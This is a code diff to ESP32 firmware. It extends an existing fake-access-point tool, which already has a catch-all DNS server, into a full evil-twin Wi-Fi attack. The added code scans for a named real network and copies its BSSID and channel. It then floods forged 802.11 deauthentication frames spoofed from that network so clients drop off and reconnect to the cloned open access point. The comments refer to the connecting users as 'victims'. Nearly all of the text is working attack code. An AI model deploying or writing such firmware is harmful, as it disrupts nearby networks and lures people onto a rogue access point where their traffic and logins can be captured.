@@ -18,12 +18,32 @@
 #define UART_BAUD_RATE 115200
 #define BUF_SIZE       1024
 
-static bool ap_running  = false;
-static bool dns_running = false;
-static TaskHandle_t dns_task_handle = NULL;
+static bool ap_running    = false;
+static bool dns_running   = false;
+static bool deauth_running = false;
+static TaskHandle_t dns_task_handle    = NULL;
+static TaskHandle_t deauth_task_handle = NULL;
 
 // ESP32 AP default gateway IP — all DNS replies point here
 #define AP_IP "192.168.4.1"
+
+// Deauth frame burst count per cycle
+#define DEAUTH_BURST 10
+
+// Target network state
+static uint8_t target_bssid[6] = {0};
+static uint8_t target_channel   = 0;
+
+// 802.11 deauth frame template
+static const uint8_t deauth_frame_template[] = {
+    0xC0, 0x00,                                     // frame control: management / deauth
+    0x00, 0x00,                                     // duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // destination (broadcast)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // source (filled at runtime = target BSSID)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // BSSID  (filled at runtime = target BSSID)
+    0x00, 0x00,                                     // sequence control
+    0x01, 0x00                                      // reason 1: unspecified
+};
 
 // ── UART ─────────────────────────────────────────────────────────────────────
 
@@ -180,36 +200,126 @@ void stop_dns() {
     dns_task_handle = NULL;
 }
 
+// ── Scan for target SSID and grab its BSSID + channel ────────────────────────
+
+bool find_target(const char *ssid) {
+    wifi_scan_config_t scan_cfg = {
+        .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = true
+    };
+    esp_wifi_scan_start(&scan_cfg, true);
+
+    uint16_t count = 0;
+    esp_wifi_scan_get_ap_num(&count);
+    if (count == 0) return false;
+
+    wifi_ap_record_t *list = malloc(count * sizeof(wifi_ap_record_t));
+    esp_wifi_scan_get_ap_records(&count, list);
+
+    bool found = false;
+    for (int i = 0; i < count; i++) {
+        if (strcmp((char *)list[i].ssid, ssid) == 0) {
+            memcpy(target_bssid, list[i].bssid, 6);
+            target_channel = list[i].primary;
+            found = true;
+            break;
+        }
+    }
+    free(list);
+    return found;
+}
+
+// ── Send one forged deauth frame ──────────────────────────────────────────────
+
+void send_deauth_frame(const uint8_t *dst, const uint8_t *bssid) {
+    uint8_t frame[sizeof(deauth_frame_template)];
+    memcpy(frame, deauth_frame_template, sizeof(frame));
+    memcpy(frame + 4,  dst,   6);   // destination
+    memcpy(frame + 10, bssid, 6);   // source = BSSID
+    memcpy(frame + 16, bssid, 6);   // BSSID
+    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+}
+
+// ── Deauth task — runs continuously while deauth_running is true ──────────────
+
+void deauth_task(void *arg) {
+    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+    while (deauth_running) {
+        for (int i = 0; i < DEAUTH_BURST; i++) {
+            send_deauth_frame(broadcast, target_bssid);
+        }
+        vTaskDelay(100 / portTICK_PERIOD_MS);
+    }
+
+    send("DEAUTH:STOPPED\n");
+    vTaskDelete(NULL);
+}
+
+void start_deauth() {
+    deauth_running = true;
+    xTaskCreate(deauth_task, "deauth", 4096, NULL, 6, &deauth_task_handle);
+    sendf("DEAUTH:STARTED BSSID=%02X:%02X:%02X:%02X:%02X:%02X CH=%d\n",
+          target_bssid[0], target_bssid[1], target_bssid[2],
+          target_bssid[3], target_bssid[4], target_bssid[5],
+          target_channel);
+}
+
+void stop_deauth() {
+    deauth_running = false;
+    deauth_task_handle = NULL;
+}
+
 // ── Start fake AP with given SSID ─────────────────────────────────────────────
 
 void start_ap(const char *ssid) {
     if (ap_running) {
+        stop_deauth();
         esp_wifi_stop();
         ap_running = false;
     }
 
     esp_netif_create_default_wifi_ap();
+    esp_netif_create_default_wifi_sta();
 
+    // APSTA mode: AP is visible to victims while STA side scans + sends raw frames
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+
+    // First scan for the real target network to get its BSSID and channel
+    sendf("TWIN:SCANNING_FOR:%s\n", ssid);
+    esp_wifi_start();
+
+    if (!find_target(ssid)) {
+        sendf("ERR:SSID_NOT_FOUND:%s\n", ssid);
+        esp_wifi_stop();
+        return;
+    }
+
+    sendf("TWIN:TARGET_FOUND BSSID=%02X:%02X:%02X:%02X:%02X:%02X CH=%d\n",
+          target_bssid[0], target_bssid[1], target_bssid[2],
+          target_bssid[3], target_bssid[4], target_bssid[5],
+          target_channel);
+
+    // Lock onto the target channel so deauth frames hit the right channel
+    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
+
+    // Configure and bring up the fake AP with the same SSID
     wifi_config_t ap_cfg = {
         .ap = {
-            .channel        = 6,
+            .channel        = target_channel,
             .max_connection = 8,
-            .authmode       = WIFI_AUTH_OPEN,  // open network — no password, like the real one
+            .authmode       = WIFI_AUTH_OPEN,
         },
     };
-    // Copy SSID into config
     strncpy((char *)ap_cfg.ap.ssid, ssid, sizeof(ap_cfg.ap.ssid) - 1);
     ap_cfg.ap.ssid_len = strlen(ssid);
-
-    esp_wifi_set_mode(WIFI_MODE_AP);
     esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
-    esp_wifi_start();
 
     ap_running = true;
     sendf("TWIN:AP_STARTED:%s\n", ssid);
 
-    // Start DNS server so every domain resolves to us
+    // Start DNS server and deauth attack simultaneously
     start_dns();
+    start_deauth();
 }
 
 // ── Stop AP ───────────────────────────────────────────────────────────────────
@@ -219,6 +329,7 @@ void stop_ap() {
         send("TWIN:AP_NOT_RUNNING\n");
         return;
     }
+    stop_deauth();
     stop_dns();
     esp_wifi_stop();
     ap_running = false;
